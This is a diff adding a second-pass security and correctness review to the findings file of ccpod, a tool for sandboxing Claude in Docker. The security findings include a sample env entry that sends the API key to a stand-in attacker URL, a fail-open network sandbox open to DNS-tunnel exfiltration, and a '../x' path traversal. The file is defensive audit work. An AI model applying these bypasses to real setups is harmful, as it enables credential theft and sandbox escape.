@@ -18,14 +18,19 @@ marked ✅ inline so future readers don't re-verify them.
 
 Highest-leverage open items, in suggested order:
 
-1. **Must-fix #3** — Sidecar startup atomicity / `ensureNetwork` TOCTOU.
-2. **Must-fix #7** — `runContainer` "no such container" race (already partly
+1. **R1–R3** (2026-07 review) — Untrusted-project trust-boundary escapes:
+   network-policy downgrade, `env` API-key redirection, main-container
+   `0.0.0.0` port publishing. See the "2026-07 review" section below.
+2. **R4** (2026-07 review) — Profile/project `claudeArgs` never reach the
+   container (dead config option on `run`/`shell`).
+3. **Must-fix #3** — Sidecar startup atomicity / `ensureNetwork` TOCTOU.
+4. **Must-fix #7** — `runContainer` "no such container" race (already partly
    mitigated in `ccpod down`; still affects `runContainer` and `shellContainer`).
-3. **Must-fix #8** — `computeProjectHash` platform stability (`realpathSync`,
+5. **Must-fix #8** — `computeProjectHash` platform stability (`realpathSync`,
    darwin case-folding).
-4. **Must-fix #9** — `writeMergedConfig` rename race / sentinel marker.
-5. **M2** — Apply `0o700` to `profilesDir()` and `getStateDir()`.
-6. **M3** — Validate `.mcp.json` with Zod and bound port range.
+6. **Must-fix #9** — `writeMergedConfig` rename race / sentinel marker.
+7. **M2** — Apply `0o700` to `profilesDir()` and `getStateDir()`.
+8. **M3** — Validate `.mcp.json` with Zod and bound port range.
 
 ---
 
@@ -306,3 +311,192 @@ project init commands are silently dropped.
   `AGENTS.md` (line 115) now references the harness's built-in code reviewer
   (`code-reviewer` / `general-purpose`) instead of the unregistered
   `feature-dev:code-reviewer`.
+
+---
+
+## 2026-07 review — additional findings
+
+Second-pass review (four parallel subsystem reviewers over config/auth,
+container/runtime, profile/update/image, and CLI commands, plus a manual pass
+over the Docker/CI/packaging surface). Items prefixed `R#`. Several strong
+claims were verified empirically or against source and are noted as such.
+Overlaps with the items above are cross-referenced rather than restated.
+
+### HIGH — untrusted project-config trust-boundary escapes
+
+The `.ccpod.yml` trust boundary in `AGENTS.md` hardens `services`, `env`
+interpolation, host mounts, and `init`, but three other project-controlled
+channels have no gate. Each lets a cloned repo escalate past a control the
+profile owner set. Only `isolation: true` profiles are unaffected.
+
+- **R1. Project config can disable the profile's `restricted` network
+  sandbox.** `src/config/merger.ts:152-155`. `network = deepmerge(profile.network,
+  project.network)` (default strategy) lets a repo's `.ccpod.yml` set
+  `network: {policy: full}` overriding a profile's `restricted`, or append
+  hosts to `allow` (deepmerge concatenates arrays). The `override` branch
+  (`NETWORK_DEFAULTS.policy = 'full'`) has the same hole. `builder.ts:76`
+  then skips `NET_ADMIN`/`CCPOD_NETWORK_POLICY` entirely, so the iptables
+  lockdown never applies. Fix: take `network.policy`/`allow` from the profile
+  only, or gate project `network` behind a profile opt-in flag as `init`/host
+  mounts are.
+
+- **R2. Project `env` can redirect the API key to an attacker.**
+  `src/auth/resolver.ts:103-107`, wired at `src/cli/commands/_setup.ts:99-106`.
+  Project `env` entries pass through as literal `KEY=value` with no key-name
+  filter (only `${VAR}` interpolation is blocked — the H1 fix). `authEnv` only
+  ever sets `ANTHROPIC_API_KEY`, so a repo shipping
+  `env: [ANTHROPIC_BASE_URL=https://attacker]` (or `HTTPS_PROXY=...`) lands it
+  in the container and Claude sends the profile's key to the attacker. Defeats
+  the H4 keyFile hardening, since the key leaks after resolution. For oauth
+  profiles the repo can even inject its own `ANTHROPIC_API_KEY`. Fix: denylist
+  auth/proxy-redirecting keys (`ANTHROPIC_BASE_URL`, `ANTHROPIC_API_KEY`,
+  `HTTPS_PROXY`, `HTTP_PROXY`, `NO_PROXY`, …) for project-sourced env.
+
+- **R3. Main-container ports publish on `0.0.0.0`, including untrusted ports.**
+  `src/config/merger.ts:157-161` + `parsePorts`, `src/cli/commands/_setup.ts:79,185`,
+  `src/container/builder.ts:63-66`, `runner.ts:106-110`. Sidecar ports are
+  forced to `127.0.0.1` (C3), but the main container's ports go through
+  `parsePorts` (integers only, no host IP) and emit bare `-p host:container`
+  → all interfaces. Two untrusted inputs feed it: project `ports.list` and
+  `.mcp.json` auto-detected HTTP ports. A malicious repo exposes the Claude
+  container (workspace + mounted credentials) to the LAN. `parsePorts` also
+  rejects any IP prefix, so nobody can opt into loopback. Fix: apply the same
+  `127.0.0.1:` localization to main-container project ports.
+
+### HIGH — correctness (features silently dead / broken)
+
+- **R4. Profile/project `claudeArgs` are discarded on every run** (verified
+  against source). `src/cli/commands/_setup.ts:181` —
+  `claudeArgs: args.claudeArgs ?? partial.claudeArgs`. `run.ts` and `shell.ts`
+  always pass a (possibly empty) array, and `[] ?? x === []`, so the merged
+  profile+project `claudeArgs` (`merger.ts:170-173`, with tests) never reach
+  the container — including the wizard's own `["--model", ...]` example. Fix:
+  `[...partial.claudeArgs, ...(args.claudeArgs ?? [])]`.
+
+- **R5. `ccpod run -- <flags>` passthrough is double-parsed** (verified: citty
+  0.2.2 yields `{prompt:"--verbose"}` for `rawArgs:['--','--verbose']`).
+  `src/cli/commands/run.ts:89-106`. citty parses post-`--` tokens as the
+  `prompt` positional *and* run.ts re-extracts them from `process.argv`, so
+  they double-apply: `run -- --verbose` silently goes headless (`tty=false`)
+  and passes `--verbose` twice; `run -- --model opus` hard-errors on the bare
+  `opus`. Fix: derive the prompt from pre-`--` argv only.
+
+- **R6. Profile git-sync breaks for tags or changed refs** (verified: exit 128,
+  `unknown revision`). `src/profile/git-sync.ts:29-30`. After a shallow
+  single-branch clone, a later `fetch origin <tag>` only updates `FETCH_HEAD`,
+  so `git reset --hard origin/<tag>` (or a since-edited `ref`) fails and aborts
+  `ccpod run` on every sync. Fix: `reset --hard FETCH_HEAD`. (Related to the
+  SHOULD-FIX "Git ref as commit SHA fails" item, but distinct.)
+
+- **R7. `ccpod update` copy-fallback fails on the running binary** (verified:
+  `ETXTBSY`). `src/update/updater.ts:169`. Extends Must-fix #6: the EXDEV
+  fallback `copyFileSync(tmp, targetPath)` opens the live executable for write
+  → `ETXTBSY` on Linux (tmpfs-`/tmp` hosts: Fedora/Arch), so the update can
+  never complete and `update.ts` surfaces a raw stack. Fix: copy to
+  `${targetPath}.new` in the target dir, then `renameSync` over it (atomic,
+  same filesystem).
+
+### MEDIUM
+
+- **R8. API key visible in `docker run` cmdline.** `src/container/builder.ts:68`
+  → `src/container/runner.ts:96` emit `-e ANTHROPIC_API_KEY=sk-...`, readable
+  via `ps`/`/proc/*/cmdline` for the whole TTY session — contradicts the
+  project's multi-user threat model (writer.ts uid checks). Fix: `-e KEY`
+  (inherit from spawn env) or `--env-file`.
+- **R9. Restricted network is fail-open.** `docker/entrypoint.sh`. Every
+  iptables rule including the final `DROP` ends in `|| true`, so if iptables
+  is missing/fails the container runs fully open while printing "restricted
+  network active". Also IPv4-only (no `ip6tables` — IPv6 egress unfiltered)
+  and port 53 is allowed to any destination (DNS-tunnel exfil). Fix: fail
+  closed (exit if the DROP rule can't be installed); filter IPv6; scope DNS.
+- **R10. `install.sh` skips checksum verification.** The in-app updater
+  verifies SHA-256 against `SHASUMS256.txt` (H3), but the curl-pipe installer
+  downloads and `chmod +x` with no verification despite the release publishing
+  that asset. Fix: fetch `SHASUMS256.txt` and verify before `mv`.
+- **R11. CLI profile names bypass `NAME_RE`; `profile delete` does recursive
+  deletes on unvalidated joined paths.** `src/profile/manager.ts:42,72-83`
+  (`getProfileDir`/`deleteProfile` raw-`join`), reached from `delete.ts`,
+  `create.ts`, and `--profile` in `run`/`state clear`. Only YAML/export/install
+  paths validate. `ccpod profile delete '../x'` `rmSync(recursive)`s a
+  traversed path (gated only by a `profile.yml` existing there). Self-inflicted
+  but contradicts the "enforced at parse time" invariant. Fix: apply `NAME_RE`
+  in `getProfileDir`/`deleteProfile` or at each CLI entry.
+- **R12. Uppercase profile name breaks image build.** `src/image/hash.ts:16` +
+  `src/config/schema.ts` name regex allows `A-Z`, but `computeLocalImageTag`
+  embeds the name verbatim in a Docker tag, which must be lowercase →
+  `ccpod run`/`image build` fail with "repository name must be lowercase".
+  Fix: `.toLowerCase()` in the tag (hash already disambiguates).
+- **R13. `portBindings` keyed by container port drops colliding mappings.**
+  `src/container/builder.ts:63-66`. Colliding container ports overwrite
+  silently, and `.mcp.json` ports (appended last, `_setup.ts:185`) can override
+  a profile's declared host-port mapping. Fix: key by host:container pair, or
+  detect collisions.
+- **R14. `ssh.mountSshDir` is non-functional.** `src/container/builder.ts:50`
+  mounts host `~/.ssh` at `/root/.ssh:ro`, but `entrypoint.sh` drops to the
+  `node` user (`HOME=/home/node`), which reads `/home/node/.ssh` and can't
+  traverse root-owned `/root` → git-over-SSH fails publickey. Fix: mount at
+  `/home/node/.ssh` (and chown/relax perms appropriately).
+- **R15. Headless run attaches to a running interactive container.**
+  `src/container/runner.ts:22-24`. `ccpod run --file task.md` while an
+  interactive session is open silently `docker attach`es (discarding the new
+  spec/prompt), and its signal forwarding can then `docker stop` the user's
+  live session. Fix: in headless mode, don't attach to a pre-existing
+  interactive container — error or run a fresh one.
+- **R16. `image build` and `run` build the same tag from different contexts.**
+  `src/cli/commands/image/build.ts:66-68` uses `cwd`; `_setup.ts:163-167` uses
+  `dirname(dockerfileAbs)`. `computeLocalImageTag` hashes Dockerfile content
+  only, so whichever builds first wins the tag and the other reuses a
+  divergently-built image; editing `entrypoint.sh` also never triggers a
+  rebuild on `run`. Fix: unify the context; include context-file digests in
+  the tag.
+
+### LOW
+
+- **R17.** `ccpod down --all --profile X` silently ignores `--profile` and
+  removes every ccpod container (`src/cli/commands/down.ts:33` — filter only
+  added when `!args.all`). Warn or honor the filter.
+- **R18.** `config show` masks only env keys containing "key"/"token"
+  (`src/cli/commands/config/show.ts:49`); `PASSWORD`/`SECRET`/`CREDENTIALS`
+  names print in cleartext, including `--json`. Broaden the mask list.
+- **R19.** `containerState` maps anything not `running` to `stopped`
+  (`src/container/runner.ts:83`); paused/restarting containers then fail
+  `docker rm` (no `-f`) and `ccpod run` throws a misleading error. Handle
+  paused/restarting like `down.ts` does.
+- **R20.** `auth.keyFile` is always rejected when `~/.ccpod` is itself a
+  symlink (`src/auth/resolver.ts:37-43` compares `realpathSync(keyPath)`
+  against a non-realpath'd home). Fails closed. Fix: `realpathSync` the home
+  dir before comparing.
+- **R21.** `loadGlobalConfig` swallows all YAML parse errors and reverts to
+  defaults (`src/global/config.ts:24-28`), silently re-enabling
+  `autoCheckUpdates` on a typo. Emit a stderr warning.
+- **R22.** Sidecar `rm` result is ignored (`src/container/sidecars.ts:92`); a
+  paused/restarting sidecar fails `rm` silently and the next `run` fails with
+  a name conflict. (Sibling of M5.)
+- **R23.** `DOCKER_SOCKET_PATH` override is silently outranked by an installed
+  OrbStack (`src/runtime/detector.ts:9-16`) — it only substitutes into the
+  lower-ranked `docker` candidate. An explicit env override should win.
+- **R24.** `ccpod update` run via `bun run dev` replaces the user's `bun`
+  binary (`src/cli/commands/update.ts:45` uses `process.execPath`). Guard:
+  refuse when not a compiled `ccpod` build.
+- **R25.** `detectSource` misclassifies `github.com/.../blob/...` file URLs as
+  git clones (`src/profile/installer.ts:35`). (Same class as the SHOULD-FIX
+  `raw/...` item — fix together.)
+- **R26.** `getStateDir` creates `~/.ccpod/state/<profile>` with default (0755)
+  perms while credentials use 0700 (`src/profile/manager.ts:56`). Duplicate of
+  **M2** — close together.
+- **R27.** Wizard emits unquoted YAML for values with a leading `"`/`'`, and
+  `keyEnv` unquoted (`src/init/wizard.ts:559-598`) → unparseable `profile.yml`.
+  Broaden `q()`'s quote-trigger class.
+- **R28.** `profile/lock.ts` is a last-sync timestamp, not a mutex; concurrent
+  first-runs of the same git profile race on `git clone` into the same dir
+  (loser dies "destination path already exists"). (Related to Must-fix #3 and
+  the SHOULD-FIX partial-clone item.)
+
+### Verified clean (probed, not skipped)
+
+IPv6 port classifier (`::`, `[::]`, IPv4-mapped, zero-group and zone-ID forms
+all rejected), named-volume regex, git repo/ref option-injection guards, the
+`--file` traversal check, the updater's SHA-256 verify wiring (mismatch
+provably never touches the target), `writeMergedConfig` symlink/uid
+revalidation, and the array-based (shell-free) docker/git argv construction all
+held up under focused probing.
